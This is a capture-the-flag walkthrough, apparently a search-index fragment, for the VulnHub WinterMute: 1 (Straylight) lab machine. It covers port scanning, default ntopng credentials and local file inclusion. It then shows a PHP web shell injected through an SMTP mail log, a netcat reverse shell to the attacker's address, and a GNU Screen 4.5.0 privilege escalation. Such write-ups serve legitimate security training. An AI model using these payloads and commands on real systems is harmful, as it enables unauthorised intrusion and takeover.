1 (Straylight)"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#vulnhub-wintermute-1-straylight","text":"Author: Hades - LeeCyberSec Scripting here","title":"VulnHub WinterMute: 1 (Straylight)"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#vm-details","text":"Name WinterMute: 1 Date release 5 Jul 2018 Author creosote Series WinterMute","title":"VM Details"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#openning-services","text":"To scan all open ports in WinterMute I run nmap with -p- options and enum service at each port. \u250c\u2500\u2500 ( Hades\u327f192.168.56.110 ) - [ 3 .4:37.2 ] ~/scripting \u2514\u2500$ sudo ./enum/all.sh 192 .168.56.102 ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 192 .168.56.102 | grep ^ [ 0 -9 ] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [ + ] Openning ports: 25 ,80,3000 ### Services Enumeration ############################ nmap -sC -sV -Pn 192 .168.56.102 -p25,80,3000 <snip> PORT STATE SERVICE VERSION 25 /tcp open smtp Postfix smtpd | _smtp-commands: straylight, PIPELINING, SIZE 10240000 , VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, | ssl-cert: Subject: commonName = straylight | Subject Alternative Name: DNS:straylight | Not valid before: 2018 -05-12T18:08:02 | _Not valid after: 2028 -05-09T18:08:02 | _ssl-date: TLS randomness does not represent time 80 /tcp open http Apache httpd 2 .4.25 (( Debian )) | _http-server-header: Apache/2.4.25 ( Debian ) | _http-title: Night City 3000 /tcp open hadoop-datanode Apache Hadoop | hadoop-datanode-info: | _ Logs: submit | hadoop-tasktracker-info: | _ Logs: submit | http-title: Welcome to ntopng | _Requested resource was /lua/login.lua?referer = / | _http-trane-info: Problem with XML parsing of /evox/about MAC Address: 08 :00:27:0E:1B:0D ( Oracle VirtualBox virtual NIC ) Service Info: Host: straylight Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done : 1 IP address ( 1 host up ) scanned in 20 .67 seconds","title":"Openning Services"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#postfix-smtpd","text":"### SMTP Enumeration (25) ############################ <snip> PORT STATE SERVICE 25 /tcp open smtp | _smtp-commands: straylight, PIPELINING, SIZE 10240000 , VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, | smtp-enum-users: | _ Method RCPT returned a unhandled status code. | _smtp-open-relay: Server doesn ' t seem to be an open relay, all tests failed | smtp-vuln-cve2010-4344: | _ The SMTP server is not Exim: NOT VULNERABLE MAC Address: 08 :00:27:0E:1B:0D ( Oracle VirtualBox virtual NIC ) Nmap done : 1 IP address ( 1 host up ) scanned in 31 .68 seconds Using nc to access to smtp service and run some common commands. In here, we can sent a mail without authentication. \u250c\u2500\u2500 ( Hades\u327f192.168.56.110 ) - [ 4 .2:41.3 ] ~/scripting \u2514\u2500$ nc -nC 192 .168.56.102 25 220 straylight ESMTP Postfix ( Debian/GNU ) vrfy root 252 2 .0.0 root mail from: \"root@localhost\" 250 2 .1.0 Ok rcpt to: \"root\" 250 2 .1.5 Ok data 354 End data with <CR><LF>.<CR><LF> root . 250 2 .0.0 Ok: queued as 3674F5516","title":"Postfix smtpd"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#apache-httpd-2425","text":"Brower to the web application and get some messages in hone page, after that, the website redirect to www.html and sent another messages. [+] Files and directories gobuster dir -k -u http://192.168.56.102:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> =============================================================== /manual ( Status: 301 ) [ Size: 317 ] [ --> http://192.168.56.102/manual/ ] /freeside ( Status: 301 ) [ Size: 319 ] [ --> http://192.168.56.102/freeside/ ] /server-status ( Status: 403 ) [ Size: 302 ] <snip> [+] All URLs curl -k http://192.168.56.102:80 -s -L | grep \"title\\|href\" | sed -e 's/^[[:space:]]*//' <link rel = \"stylesheet\" href = \"gl.css\" > <title>Night City</title>","title":"Apache httpd 2.4.25"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#apache-hadoop-ntopng","text":"At ntopng Web GUI , I know that the default login is admin:admin . Try it and get admin page. Go to http://192.168.56.102:3000/lua/flows_stats.lua , there is a url /turing-bolo/ . There are content at file case.log via url http://192.168.56.102/turing-bolo/bolo.php?bolo=case","title":"Apache Hadoop ntopng"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#local-file-inclusion","text":"Web application auto add .log after the provided value. I find some log in the Kali Machine to trying access it in the server with payload bolo=../../../../../../var/log/apt/history \u250c\u2500\u2500 ( Hades\u327f192.168.56.110 ) - [ 4 .6:23.8 ] ~/scripting \u2514\u2500$ find / -name *.log 2 > /dev/null <snip> /var/log/apt/history.log /var/log/dpkg.log","title":"Local File Inclusion"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#postfix-mail-log-file-backdoor","text":"I used Postfix SMTP and sent a email with php backdoor Poc code here \u250c\u2500\u2500 ( Hades\u327f192.168.56.110 ) - [ 3 .0:40.9 ] ~/scripting \u2514\u2500$ nc -nC 192 .168.56.102 25 220 straylight ESMTP Postfix ( Debian/GNU ) mail from: \"hades <?php system( $_GET ['cmd']); ?> hades\" 250 2 .1.0 Ok rcpt to: \"root@localhost\" 250 2 .1.5 Ok data 354 End data with <CR><LF>.<CR><LF> . 250 2 .0.0 Ok: queued as D4E985515 quit 221 2 .0.0 Bye Go to Postfix mail log file /var/log/mail curl -v --silent \"http://192.168.56.102/turing-bolo/bolo.php?bolo=/var/log/mail&cmd= $cmd \" 2 > & 1 | sed -ne '/hades/,$ p' | sed '/hades@/Q' | sed 's/.*hades //' uid = 33 ( www-data ) gid = 33 ( www-data ) groups = 33 ( www-data )","title":"Postfix mail log file backdoor"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#getting-reverse-shell","text":"hURL -U 'nc -nv 192.168.56.110 4444 -e /bin/bash' cmd = 'nc%20-nv%20192.168.56.110%204444%20-e%20%2Fbin%2Fbash' curl -v --silent \"http://192.168.56.102/turing-bolo/bolo.php?bolo=/var/log/mail&cmd= $cmd \" 2 > & 1 | sed -ne '/hades/,$ p' | sed '/hades@/Q' | sed 's/.*hades //' sudo nc -nvlp 4444","title":"Getting reverse shell"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#privilege-escalation","text":"Upgrade shell /usr/bin/python -c \"import pty; pty.spawn('/bin/bash')\" export TERM = xterm ^Z stty raw -echo ; fg","title":"Privilege escalation"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#binaries-that-autoelevate","text":"www-data@straylight:/tmp$ find / -perm -u = s -type f 2 >/dev/null /bin/su /bin/umount /bin/mount /bin/screen-4.5.0 <snip> www-data@straylight:/tmp$","title":"Binaries That AutoElevate"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#gnu-screen-450-exploit","text":"\u250c\u2500\u2500 ( Hades\u327f192.168.56.110 ) - [ 1 .4:23.7 ] ~ \u2514\u2500$ searchsploit screen 4 .5.0 --------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------- --------------------------------- GNU Screen 4 .5.0 - Local Privilege Escalation | linux/local/41154.sh GNU Screen 4 .5.0 - Local Privilege Escalation ( PoC ) | linux/local/41152.txt --------------------------------------------------------- --------------------------------- Shellcodes: No Results At /tmp in the unix machine, I create 2 file libhax.c rootshell.c and run poc.sh to get root. Poc code here bash poc.sh 2 > /dev/null","title":"GNU Screen 4.5.0 exploit"},{"location":"walkthrough/vulnhub/Wintermute-1-Straylight/index.html#post-exploitation","text":"Enum network, there are 2 interfaces enp0s3 and enp0s8 root@straylight:/tmp# ifconfig enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 192.168.56.102 netmask 255.255.255.0 broadcast 192.168.56.255 inet6 fe80::a00:27ff:fe0e:1b0d prefixlen 64 scopeid 0x20<link> ether 08:00:27:0e:1b:0d txqueuelen 1000 (Ethernet) RX packets 498352 bytes 66009694 (62.9 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 408318 bytes 173600084 (165.5 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 192.168.107.106 netmask 255.255.255.0 broadcast 192.168.107.255 inet6 fe80::a00:27ff:fec0:db47 prefixlen 64 scopeid 0x20<link> ether 08:00:27:c0:db:47 txqueuelen 1000 (Ethernet) RX packets 244 bytes 34210 (33.4 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 45 bytes 7450 (7.2 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 <snip> Poc code here root@straylight:/tmp# bash pingSweeping.sh 192.168.107 192.168.107.2 192.168.107.1 192.168.107.106 192.168.107.107 Scan open port in 192.168.107.107 with nc . root@straylight:/tmp# nc -nv -w 1 -z 192 .168.107.107 1 -65535 ( UNKNOWN ) [ 192 .168.107.107 ] 34483 ( ? ) open ( UNKNOWN ) [ 192 .168.107.107 ] 8080 ( http-alt ) open ( UNKNOWN ) [ 192 .168.107.107 ] 8009 ( ? ) open WinterMute: 1 (Neuromancer)","title":"Post Exploitation"}]}